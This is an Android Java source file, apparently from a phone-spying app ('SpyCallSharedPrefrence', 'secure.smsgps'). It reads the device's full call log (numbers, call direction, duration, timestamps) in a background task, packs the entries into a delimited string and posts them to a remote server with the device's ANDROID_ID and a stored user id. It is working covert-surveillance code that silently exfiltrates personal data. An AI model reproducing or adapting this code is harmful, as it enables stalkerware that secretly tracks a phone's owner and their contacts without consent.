/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.text.SimpleDateFormat;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class CallDetailsAsyncTask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "CallDetailsAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	
	/**
	 * 
	 */
	public CallDetailsAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		
		try{
			getCallDetails();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedCall();
		}
		
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	private void getCallDetails() {
		String callDetail = "";
		String phNumber = "";
		String callType ="";
		String callDate ="";
		String call_id="";
		try{
		final long preCallCount = SpyCallSharedPrefrence.getsaveCALL_PreCount(ctx);
		//Log.e("PreCallCount**********", "" + PreCallCount);

		final Cursor managedCursor = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, "date >" + preCallCount, null,CallLog.Calls.DATE + " DESC");

		final int getTotalCount = managedCursor.getCount();

		final int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		final int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		final int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
		final int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
		final int id = managedCursor.getColumnIndex(CallLog.Calls._ID);
		
		if (getTotalCount != 0) {
			String countCallDate = null;

			while (managedCursor.moveToNext()) {

				phNumber = managedCursor.getString(number);
				callType = managedCursor.getString(type);
				callDate = managedCursor.getString(date);

				if(phNumber.equalsIgnoreCase(""))
				{
					phNumber = "-";
				}
				if(callType.equalsIgnoreCase(""))
				{
					callType = "-";
				}
				if(callDate.equalsIgnoreCase(""))
				{
					callDate = "-";
				}
				
				call_id = managedCursor.getString(id);
				// Log.e("CALL DATEEEEEEE",phNumber+","+callDate);

				/*@SuppressWarnings("unused")
				String name = managedCursor.getString(managedCursor
						.getColumnIndex(CallLog.Calls.CACHED_NAME));
				Date callDayTime = new Date(Long.valueOf(callDate));*/
				// for time of call start

				final long seconds = managedCursor.getLong(date);
				// SimpleDateFormat sdf = new SimpleDateFormat("HH:mm");
				final SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				// for time of call end 2013-01-22 16:00:46
				final String dateString = sdf.format(new java.util.Date(seconds));

				final String callDuration = managedCursor.getString(duration);
				String dir = null;
				final int dircode = Integer.parseInt(callType);
				if (dircode == 1) {
					dir = "Incoming";
				} else if (dircode == 2) {
					dir = "Outgoing";
				} else if (dircode == 3) {
					dir = "Missed";
				} else if (dircode == 5) {
					dir = "Reject";
				}
				if (managedCursor.getPosition() == 0) {
					countCallDate = callDate;
				}

				final String strCall = phNumber + "|||" + dir + "|||" + callDuration+ "|||" + dateString + "|||" + call_id  ;

				if (callDetail.length() != 0) {
					callDetail = strCall + "##KM##" + callDetail;
				} else {
					callDetail = strCall;
				}
				// LastCallDate=Long.parseLong(callDate);
			}
			managedCursor.close();
			try {
				if (!"".equals(callDetail)) {
					if (Utility.isNetworkAvailable(ctx)) {
						new YourAsyncTaskCall().execute(countCallDate,callDetail);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			//getBrowserDetail();
		}
       }catch (Exception e) {
    	   e.printStackTrace();
    	  // getBrowserDetail();
	}

	}
	/**
	 * posting the data to server
	 */
	class YourAsyncTaskCall extends AsyncTask<String, Void, Void> {
		
		private String getResponceCallLog;
		/**
		 * 
		 */
		public YourAsyncTaskCall() {
		}
		@Override
		protected void onPreExecute() {

		}

		@Override
		protected Void doInBackground(String... params) {        
			//make your request here - it will run in a different thread
			try{
				mRequestPostClass=new RequestPost();
				String getUserID_SP  = HinjAppPreferenceUtils.getRaId(ctx);
			
				String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				getResponceCallLog=mRequestPostClass.postCallPost(params[1],getUserID_SP,android_id);
				
				final JSONObject responseObject = new JSONObject(getResponceCallLog);
				final JSONArray responseArray = responseObject.getJSONArray("call");
				if(responseArray.getJSONObject(0).toString().contains("success")){					
					SpyCallSharedPrefrence.saveCALL_PreCount(ctx,Long.parseLong(params[0]));	
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			Log.i(TAG,getResponceCallLog);
			//getBrowserDetail();

		}
	}	


	/********************geCallDetail End********************/
}
